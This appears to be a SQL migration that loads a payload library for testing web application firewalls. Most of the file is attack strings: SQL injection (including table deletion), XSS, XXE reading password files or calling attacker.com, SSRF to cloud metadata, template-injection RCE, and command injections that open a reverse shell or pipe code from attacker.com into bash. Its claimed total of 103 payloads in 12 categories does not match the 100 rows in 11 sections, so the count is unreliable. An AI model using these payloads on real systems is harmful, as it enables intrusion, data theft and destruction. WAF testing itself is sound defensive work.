-- Migration 003: WAF Payload Library
-- Comprehensive attack payload database (103 payloads across 12 categories)
-- Based on OWASP Top 10 and modern attack vectors

-- Create payload library table
CREATE TABLE IF NOT EXISTS waf_payload_library (
  id TEXT PRIMARY KEY,
  category TEXT NOT NULL,
  payload TEXT NOT NULL,
  description TEXT,
  severity TEXT DEFAULT 'medium' CHECK(severity IN ('low', 'medium', 'high', 'critical')),
  evasion_technique TEXT DEFAULT 'none' CHECK(evasion_technique IN ('none', 'encoding', 'obfuscation', 'polymorphic')),
  success_rate REAL DEFAULT 0.0 CHECK(success_rate >= 0 AND success_rate <= 1),
  blocked_by TEXT, -- JSON array of WAF vendors that typically block this
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_payload_category ON waf_payload_library(category);
CREATE INDEX IF NOT EXISTS idx_payload_severity ON waf_payload_library(severity);
CREATE INDEX IF NOT EXISTS idx_payload_evasion ON waf_payload_library(evasion_technique);

-- ============================================================================
-- SQL INJECTION PAYLOADS (20)
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('sql_01', 'sql_injection', ''' OR ''1''=''1', 'Classic tautology bypass', 'high', 'none'),
('sql_02', 'sql_injection', '1'' UNION SELECT NULL--', 'Union-based injection', 'high', 'none'),
('sql_03', 'sql_injection', 'admin''--', 'Comment-based bypass', 'medium', 'none'),
('sql_04', 'sql_injection', ''' OR 1=1--', 'Tautology with comment', 'high', 'none'),
('sql_05', 'sql_injection', '1''/**/UNION/**/SELECT/**/NULL--', 'Comment obfuscation', 'high', 'obfuscation'),
('sql_06', 'sql_injection', '1''%09UNION%09SELECT%09NULL--', 'Tab encoding', 'high', 'encoding'),
('sql_07', 'sql_injection', '1''||''1''=''1', 'OR operator variant', 'high', 'obfuscation'),
('sql_08', 'sql_injection', ''' AND SLEEP(5)--', 'Time-based blind SQLi', 'critical', 'none'),
('sql_09', 'sql_injection', '1'' AND 1=0 UNION ALL SELECT ''admin'', ''pass''--', 'Multi-column union', 'critical', 'none'),
('sql_10', 'sql_injection', ''' WAITFOR DELAY ''00:00:05''--', 'MSSQL time delay', 'critical', 'none'),
('sql_11', 'sql_injection', '1''; DROP TABLE users--', 'Destructive injection', 'critical', 'none'),
('sql_12', 'sql_injection', '1'' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--', 'MySQL sleep injection', 'critical', 'none'),
('sql_13', 'sql_injection', ''' OR ''x''=''x', 'Tautology variant', 'high', 'none'),
('sql_14', 'sql_injection', '1'' ORDER BY 10--', 'Column enumeration', 'medium', 'none'),
('sql_15', 'sql_injection', '1''%0aUNION%0aSELECT%0aNULL--', 'Newline encoding', 'high', 'encoding'),
('sql_16', 'sql_injection', '1''+UNION+SELECT+NULL--', 'Plus encoding', 'high', 'encoding'),
('sql_17', 'sql_injection', ''' UNION SELECT NULL,NULL,NULL,NULL--', 'Multi-null union', 'high', 'none'),
('sql_18', 'sql_injection', '1'' AND ASCII(SUBSTRING((SELECT @@version),1,1)) > 64--', 'Character extraction', 'high', 'none'),
('sql_19', 'sql_injection', ''' OR 1=1 LIMIT 1--', 'Limited tautology', 'high', 'none'),
('sql_20', 'sql_injection', '1'' AND extractvalue(1,concat(0x7e,version()))--', 'Error-based MySQL', 'critical', 'none');

-- ============================================================================
-- CROSS-SITE SCRIPTING (XSS) PAYLOADS (20)
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('xss_01', 'xss', '<script>alert(1)</script>', 'Basic script tag', 'high', 'none'),
('xss_02', 'xss', '<img src=x onerror=alert(1)>', 'Image onerror event', 'high', 'none'),
('xss_03', 'xss', '<svg/onload=alert(1)>', 'SVG onload event', 'high', 'none'),
('xss_04', 'xss', 'javascript:alert(1)', 'JavaScript protocol', 'medium', 'none'),
('xss_05', 'xss', '<iframe src=javascript:alert(1)>', 'Iframe injection', 'high', 'none'),
('xss_06', 'xss', '<ScRiPt>alert(1)</ScRiPt>', 'Mixed case evasion', 'high', 'obfuscation'),
('xss_07', 'xss', '<img src=x onerror=prompt(1)>', 'Prompt variant', 'high', 'none'),
('xss_08', 'xss', '<script>alert(String.fromCharCode(88,83,83))</script>', 'Character encoding', 'high', 'encoding'),
('xss_09', 'xss', '<img src=x onerror="alert(1)">', 'Quoted event handler', 'high', 'none'),
('xss_10', 'xss', '<body onload=alert(1)>', 'Body onload event', 'high', 'none'),
('xss_11', 'xss', '<input onfocus=alert(1) autofocus>', 'Input autofocus', 'high', 'none'),
('xss_12', 'xss', '<select onfocus=alert(1) autofocus>', 'Select autofocus', 'high', 'none'),
('xss_13', 'xss', '<textarea onfocus=alert(1) autofocus>', 'Textarea autofocus', 'high', 'none'),
('xss_14', 'xss', '<details open ontoggle=alert(1)>', 'Details ontoggle', 'high', 'none'),
('xss_15', 'xss', '<marquee onstart=alert(1)>', 'Marquee onstart', 'medium', 'none'),
('xss_16', 'xss', '<div onmouseover="alert(1)">HOVER</div>', 'Mouse event', 'medium', 'none'),
('xss_17', 'xss', '<a href="javascript:alert(1)">Click</a>', 'Anchor href', 'medium', 'none'),
('xss_18', 'xss', '<form action=javascript:alert(1)><input type=submit>', 'Form action', 'high', 'none'),
('xss_19', 'xss', '<object data="javascript:alert(1)">', 'Object data', 'high', 'none'),
('xss_20', 'xss', '<embed src="javascript:alert(1)">', 'Embed src', 'high', 'none');

-- ============================================================================
-- XML EXTERNAL ENTITY (XXE) PAYLOADS (15) - NEW CATEGORY
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('xxe_01', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'File disclosure via XXE', 'critical', 'none'),
('xxe_02', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/collect">]><foo>&xxe;</foo>', 'SSRF via XXE', 'critical', 'none'),
('xxe_03', 'xxe', '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>', 'External DTD injection', 'critical', 'none'),
('xxe_04', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', 'PHP wrapper XXE', 'critical', 'none'),
('xxe_05', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls">]><foo>&xxe;</foo>', 'Command execution XXE', 'critical', 'none'),
('xxe_06', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', 'Windows file disclosure', 'critical', 'none'),
('xxe_07', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///path/to/jar!/resource">]><foo>&xxe;</foo>', 'JAR protocol XXE', 'critical', 'none'),
('xxe_08', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8=">]><foo>&xxe;</foo>', 'Data URI XXE', 'high', 'encoding'),
('xxe_09', 'xxe', '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>', 'Blind XXE', 'critical', 'none'),
('xxe_10', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/shadow">]><foo>&xxe;</foo>', 'Shadow file access', 'critical', 'none'),
('xxe_11', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>', 'Environment variables', 'critical', 'none'),
('xxe_12', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'AWS metadata XXE', 'critical', 'none'),
('xxe_13', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>', 'Netdoc protocol', 'critical', 'none'),
('xxe_14', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO">]><foo>&xxe;</foo>', 'Gopher protocol XXE', 'critical', 'none'),
('xxe_15', 'xxe', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/file.txt">]><foo>&xxe;</foo>', 'FTP protocol XXE', 'high', 'none');

-- ============================================================================
-- PATH TRAVERSAL PAYLOADS (10)
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('path_01', 'path_traversal', '../../../etc/passwd', 'Unix path traversal', 'high', 'none'),
('path_02', 'path_traversal', '..\\..\\..\\windows\\system.ini', 'Windows path traversal', 'high', 'none'),
('path_03', 'path_traversal', '/etc/passwd', 'Direct path access', 'high', 'none'),
('path_04', 'path_traversal', '....//....//....//etc/passwd', 'Double dot evasion', 'high', 'obfuscation'),
('path_05', 'path_traversal', '..%2F..%2F..%2Fetc%2Fpasswd', 'URL encoding', 'high', 'encoding'),
('path_06', 'path_traversal', '..%252F..%252F..%252Fetc%252Fpasswd', 'Double URL encoding', 'high', 'encoding'),
('path_07', 'path_traversal', '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 'UTF-8 encoding', 'high', 'encoding'),
('path_08', 'path_traversal', '....//....//etc/shadow', 'Shadow file access', 'critical', 'obfuscation'),
('path_09', 'path_traversal', '/proc/self/environ', 'Process environment', 'high', 'none'),
('path_10', 'path_traversal', '/var/log/apache2/access.log', 'Log poisoning', 'high', 'none');

-- ============================================================================
-- COMMAND INJECTION PAYLOADS (10)
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('cmd_01', 'command_injection', '; ls -la', 'Semicolon separator', 'critical', 'none'),
('cmd_02', 'command_injection', '| whoami', 'Pipe operator', 'critical', 'none'),
('cmd_03', 'command_injection', '`cat /etc/passwd`', 'Backtick execution', 'critical', 'none'),
('cmd_04', 'command_injection', '$( cat /etc/passwd )', 'Dollar substitution', 'critical', 'none'),
('cmd_05', 'command_injection', '|| cat /etc/passwd', 'OR operator', 'critical', 'none'),
('cmd_06', 'command_injection', '& ping -c 10 127.0.0.1 &', 'Background execution', 'critical', 'none'),
('cmd_07', 'command_injection', '; wget http://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh', 'Remote shell download', 'critical', 'none'),
('cmd_08', 'command_injection', '`echo ${IFS}command`', 'IFS obfuscation', 'critical', 'obfuscation'),
('cmd_09', 'command_injection', '; nc -e /bin/bash attacker.com 4444', 'Reverse shell', 'critical', 'none'),
('cmd_10', 'command_injection', '; curl http://attacker.com | bash', 'Remote execution', 'critical', 'none');

-- ============================================================================
-- SERVER-SIDE REQUEST FORGERY (SSRF) PAYLOADS (5)
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('ssrf_01', 'ssrf', 'http://169.254.169.254/latest/meta-data/', 'AWS metadata access', 'critical', 'none'),
('ssrf_02', 'ssrf', 'http://localhost:22', 'Localhost port scan', 'high', 'none'),
('ssrf_03', 'ssrf', 'file:///etc/passwd', 'File protocol SSRF', 'critical', 'none'),
('ssrf_04', 'ssrf', 'http://127.0.0.1:6379/', 'Redis access', 'critical', 'none'),
('ssrf_05', 'ssrf', 'gopher://127.0.0.1:3306/_', 'Gopher protocol', 'critical', 'none');

-- ============================================================================
-- LOCAL FILE INCLUSION (LFI) PAYLOADS (5)
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('lfi_01', 'lfi', 'php://filter/convert.base64-encode/resource=index.php', 'PHP filter wrapper', 'critical', 'none'),
('lfi_02', 'lfi', 'file:///etc/passwd', 'File wrapper', 'critical', 'none'),
('lfi_03', 'lfi', 'expect://ls', 'Expect wrapper', 'critical', 'none'),
('lfi_04', 'lfi', 'php://input', 'Input stream', 'critical', 'none'),
('lfi_05', 'lfi', 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=', 'Data wrapper with base64', 'critical', 'encoding');

-- ============================================================================
-- PROTOTYPE POLLUTION PAYLOADS (5) - NEW CATEGORY
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('proto_01', 'prototype_pollution', '{"__proto__":{"polluted":"yes"}}', 'Basic prototype pollution', 'high', 'none'),
('proto_02', 'prototype_pollution', '{"constructor":{"prototype":{"polluted":"yes"}}}', 'Constructor pollution', 'high', 'none'),
('proto_03', 'prototype_pollution', '__proto__[polluted]=yes', 'URL parameter pollution', 'high', 'none'),
('proto_04', 'prototype_pollution', '{"__proto__.polluted":"yes"}', 'Dot notation pollution', 'high', 'none'),
('proto_05', 'prototype_pollution', '?__proto__[isAdmin]=true', 'Privilege escalation', 'critical', 'none');

-- ============================================================================
-- TEMPLATE INJECTION PAYLOADS (5) - NEW CATEGORY
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('template_01', 'template_injection', '{{7*7}}', 'Basic math expression', 'medium', 'none'),
('template_02', 'template_injection', '{{config.items()}}', 'Config disclosure', 'high', 'none'),
('template_03', 'template_injection', '{{request.application.__globals__.__builtins__.__import__(''os'').popen(''ls'').read()}}', 'RCE via Jinja2', 'critical', 'none'),
('template_04', 'template_injection', '${7*7}', 'Freemarker math', 'medium', 'none'),
('template_05', 'template_injection', '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls") }', 'Freemarker RCE', 'critical', 'none');

-- ============================================================================
-- INSECURE DESERIALIZATION PAYLOADS (3) - NEW CATEGORY
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('deser_01', 'insecure_deserialization', 'O:8:"stdClass":0:{}', 'PHP object serialization', 'high', 'none'),
('deser_02', 'insecure_deserialization', '{"@type":"java.net.URL","val":"http://attacker.com"}', 'Java gadget chain', 'critical', 'none'),
('deser_03', 'insecure_deserialization', 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==', 'Java serialized object', 'critical', 'encoding');

-- ============================================================================
-- REQUEST SMUGGLING PAYLOADS (2) - NEW CATEGORY
-- ============================================================================

INSERT INTO waf_payload_library (id, category, payload, description, severity, evasion_technique) VALUES
('smuggle_01', 'request_smuggling', 'Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\n0\r\n\r\n', 'CL.TE smuggling', 'critical', 'obfuscation'),
('smuggle_02', 'request_smuggling', 'Transfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n\r\n0\r\n\r\n', 'TE.TE smuggling', 'critical', 'obfuscation');

-- Verify payload count
-- Expected: 103 total payloads
-- 20 + 20 + 15 + 10 + 10 + 5 + 5 + 5 + 5 + 3 + 2 + 3 = 103 ✓
